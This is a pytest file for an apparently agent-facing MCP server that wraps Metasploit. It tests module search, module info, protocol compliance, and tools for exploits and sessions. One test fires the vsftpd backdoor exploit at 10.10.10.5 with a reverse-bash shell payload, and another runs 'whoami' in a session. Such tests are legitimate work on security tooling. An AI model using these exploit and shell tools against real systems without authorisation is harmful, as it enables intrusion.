#!/usr/bin/env python3
"""
Tests for MSF MCP Server
"""

import json
import subprocess
import sys
import asyncio
from pathlib import Path

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from server import MSFClient


class TestMSFClient:
    """Unit tests for MSFClient."""

    def setup_method(self):
        """Set up test fixtures."""
        self.client = MSFClient(host='localhost', port=55553, token='test')

    def test_search_modules(self):
        """Test module search."""
        async def run_test():
            results = await self.client.search_modules('ssh')
            assert isinstance(results, list)
            # Should find ssh_login auxiliary
            names = [r['name'] for r in results]
            assert any('ssh' in n for n in names)

        asyncio.run(run_test())

    def test_search_modules_with_type(self):
        """Test module search with type filter."""
        async def run_test():
            results = await self.client.search_modules('apache', 'exploit')
            assert isinstance(results, list)
            for r in results:
                assert r['type'] == 'exploit'

        asyncio.run(run_test())

    def test_get_module_info(self):
        """Test getting module info."""
        async def run_test():
            info = await self.client.get_module_info('exploit/unix/ftp/vsftpd_234_backdoor')
            assert 'name' in info
            assert 'options' in info
            assert 'RHOSTS' in info['options']

        asyncio.run(run_test())

    def test_run_exploit(self):
        """Test running an exploit."""
        async def run_test():
            result = await self.client.run_exploit(
                module='exploit/unix/ftp/vsftpd_234_backdoor',
                options={'RHOSTS': '10.10.10.5', 'RPORT': 21},
                payload='cmd/unix/reverse_bash'
            )
            assert result['success'] is True
            assert 'job_id' in result

        asyncio.run(run_test())

    def test_run_exploit_missing_rhosts(self):
        """Test exploit fails without RHOSTS."""
        async def run_test():
            result = await self.client.run_exploit(
                module='exploit/test',
                options={},
            )
            assert result['success'] is False
            assert 'error' in result

        asyncio.run(run_test())

    def test_list_sessions(self):
        """Test listing sessions."""
        async def run_test():
            sessions = await self.client.list_sessions()
            assert isinstance(sessions, list)

        asyncio.run(run_test())

    def test_session_command(self):
        """Test session command execution."""
        async def run_test():
            result = await self.client.session_command(1, 'whoami')
            assert result['session_id'] == 1
            assert result['command'] == 'whoami'
            assert 'output' in result

        asyncio.run(run_test())


def test_mcp_protocol():
    """Test MCP JSON-RPC protocol compliance."""
    server_path = Path(__file__).parent.parent / 'server.py'

    request = json.dumps({
        "jsonrpc": "2.0",
        "id": 1,
        "method": "initialize",
        "params": {}
    }) + "\n"

    proc = subprocess.Popen(
        ['python3', str(server_path)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    stdout, stderr = proc.communicate(input=request, timeout=5)

    response = json.loads(stdout.strip())
    assert response['jsonrpc'] == '2.0'
    assert response['id'] == 1
    assert response['result']['serverInfo']['name'] == 'opulence-msf'


def test_tools_list():
    """Test tools/list returns MSF tools."""
    server_path = Path(__file__).parent.parent / 'server.py'

    requests = [
        json.dumps({"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}}) + "\n",
        json.dumps({"jsonrpc": "2.0", "id": 2, "method": "tools/list", "params": {}}) + "\n"
    ]

    proc = subprocess.Popen(
        ['python3', str(server_path)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    stdout, stderr = proc.communicate(input=''.join(requests), timeout=5)

    lines = stdout.strip().split('\n')
    tools_response = json.loads(lines[1])

    tool_names = [t['name'] for t in tools_response['result']['tools']]
    assert 'msf__search' in tool_names
    assert 'msf__exploit' in tool_names
    assert 'msf__sessions_list' in tool_names


def test_tool_call_search():
    """Test tools/call for msf__search."""
    server_path = Path(__file__).parent.parent / 'server.py'

    requests = [
        json.dumps({"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}}) + "\n",
        json.dumps({
            "jsonrpc": "2.0",
            "id": 2,
            "method": "tools/call",
            "params": {
                "name": "msf__search",
                "arguments": {"query": "ssh"}
            }
        }) + "\n"
    ]

    proc = subprocess.Popen(
        ['python3', str(server_path)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    stdout, stderr = proc.communicate(input=''.join(requests), timeout=5)

    lines = stdout.strip().split('\n')
    result = json.loads(lines[1])

    assert 'result' in result
    assert 'content' in result['result']
    content = json.loads(result['result']['content'][0]['text'])
    assert isinstance(content, list)


if __name__ == '__main__':
    import pytest
    pytest.main([__file__, '-v'])
